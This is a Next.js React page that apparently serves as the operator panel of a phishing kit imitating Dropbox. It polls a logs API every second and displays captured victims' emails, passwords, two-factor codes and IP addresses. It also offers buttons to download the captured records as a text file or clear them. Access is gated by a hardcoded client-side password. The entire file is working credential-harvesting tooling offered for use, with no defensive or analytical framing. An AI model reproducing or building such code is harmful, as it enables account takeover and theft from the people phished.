'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';

export default function LogsPage() {
  const [logs, setLogs] = useState<any[]>([]);
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const router = useRouter();

  useEffect(() => {
    // Check if already authenticated
    const auth = localStorage.getItem('logsAuth');
    if (auth === 'true') {
      setIsAuthenticated(true);
      loadLogs();
    }
  }, []);

  const loadLogs = async () => {
    try {
      const response = await fetch('/api/logs');
      const data = await response.json();
      setLogs(Array.isArray(data) ? data : []);
    } catch (error) {
      console.error('Error loading logs:', error);
      setLogs([]);
    }
  };

  // Set up interval to check for new logs every second
  useEffect(() => {
    if (isAuthenticated) {
      const interval = setInterval(loadLogs, 1000);
      return () => clearInterval(interval);
    }
  }, [isAuthenticated]);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (password === 'Mpn101305$!') {
      setIsAuthenticated(true);
      localStorage.setItem('logsAuth', 'true');
      loadLogs();
    } else {
      setError('Invalid password');
    }
  };

  const clearLogs = async () => {
    try {
      await fetch('/api/logs', { method: 'DELETE' });
      setLogs([]);
    } catch (error) {
      console.error('Error clearing logs:', error);
    }
  };

  const downloadLogs = () => {
    const logText = logs.map(log => 
      `Timestamp: ${log.timestamp}\nEmail: ${log.email}\nPassword: ${log.password}\n2FA Code: ${log.code || 'N/A'}\nType: ${log.type}\nIP Address: ${log.ipAddress}\n-------------------`
    ).join('\n\n');

    const blob = new Blob([logText], { type: 'text/plain' });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `dropbox_logs_${new Date().toISOString().split('T')[0]}.txt`;
    document.body.appendChild(a);
    a.click();
    window.URL.revokeObjectURL(url);
    document.body.removeChild(a);
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="max-w-md w-full space-y-8 p-8 bg-white rounded-lg shadow-lg">
          <div>
            <h2 className="mt-6 text-center text-3xl font-extrabold text-gray-900">
              Logs Access
            </h2>
          </div>
          <form className="mt-8 space-y-6" onSubmit={handleLogin}>
            <div className="rounded-md shadow-sm -space-y-px">
              <div>
                <label htmlFor="password" className="sr-only">
                  Password
                </label>
                <input
                  id="password"
                  name="password"
                  type="password"
                  required
                  className="appearance-none rounded relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 focus:outline-none focus:ring-blue-500 focus:border-blue-500 focus:z-10 sm:text-sm"
                  placeholder="Enter password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
              </div>
            </div>

            {error && (
              <div className="text-red-500 text-sm text-center">{error}</div>
            )}

            <div>
              <button
                type="submit"
                className="group relative w-full flex justify-center py-2 px-4 border border-transparent text-sm font-medium rounded-md text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500"
              >
                Access Logs
              </button>
            </div>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-100 py-6 flex flex-col justify-center sm:py-12">
      <div className="relative py-3 sm:max-w-xl sm:mx-auto">
        <div className="relative px-4 py-10 bg-white shadow-lg sm:rounded-3xl sm:p-20">
          <div className="max-w-md mx-auto">
            <div className="divide-y divide-gray-200">
              <div className="py-8 text-base leading-6 space-y-4 text-gray-700 sm:text-lg sm:leading-7">
                <div className="flex justify-between items-center mb-4">
                  <h1 className="text-2xl font-bold text-gray-900">Dropbox Logs</h1>
                  <div className="space-x-2">
                    <button
                      onClick={downloadLogs}
                      className="px-4 py-2 bg-green-600 text-white rounded hover:bg-green-700"
                    >
                      Download Logs
                    </button>
                    <button
                      onClick={clearLogs}
                      className="px-4 py-2 bg-red-600 text-white rounded hover:bg-red-700"
                    >
                      Clear Logs
                    </button>
                  </div>
                </div>
                <div className="space-y-4">
                  {logs.map((log, index) => (
                    <div key={index} className="p-4 bg-gray-50 rounded-lg">
                      <div className="font-semibold text-gray-900">
                        {log.type === 'LOGIN' ? 'Login Attempt' : '2FA Code'}
                      </div>
                      <div className="text-sm text-gray-600">
                        Time: {log.timestamp}
                      </div>
                      <div className="text-sm text-gray-600">
                        Email: {log.email}
                      </div>
                      <div className="text-sm text-gray-600">
                        Password: {log.password}
                      </div>
                      {log.code && (
                        <div className="text-sm text-gray-600">
                          2FA Code: {log.code}
                        </div>
                      )}
                      <div className="text-sm text-gray-600">
                        IP Address: {log.ipAddress}
                      </div>
                    </div>
                  ))}
                  {logs.length === 0 && (
                    <div className="text-center text-gray-500">
                      No logs available
                    </div>
                  )}
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
} 